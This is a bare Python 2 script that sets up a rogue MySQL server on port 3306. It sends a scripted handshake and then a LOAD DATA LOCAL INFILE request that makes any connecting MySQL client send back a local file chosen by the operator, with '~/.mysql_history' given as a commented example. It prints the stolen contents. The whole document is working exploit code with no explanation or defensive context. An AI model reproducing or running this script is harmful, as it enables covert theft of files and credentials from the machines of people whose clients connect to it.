#coding=utf-8
#recv the target file
import socket
from time import sleep
filename = raw_input()
#filename='~/.mysql_history'

a='4a0000000a352e352e353300050000007b212f663926524900fff72102000f8015000000000000000000005963644f3d2336265b796f41006d7973716c5f6e61746976655f70617373776f726400'.decode('hex')
b='0100000200'.decode('hex')
c=chr(len(filename)+1)+"\x00\x00\x01\xFB"+filename

HOST = '0.0.0.0'
PORT = 3306

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
s.bind((HOST, PORT))
s.listen(5)

print 'Server start at: %s:%s' %(HOST, PORT)
print 'wait for connection...'

while True:
    conn, addr = s.accept()
    print 'Connected by ', addr
    conn.send(a)
    print conn.recv(1024).encode('hex')
    conn.send(b)
    print conn.recv(1024).encode('hex')
    conn.send(c)
#    print conn.recv(1024)[4:]
    for i in range(10):
        print conn.recv(1024)
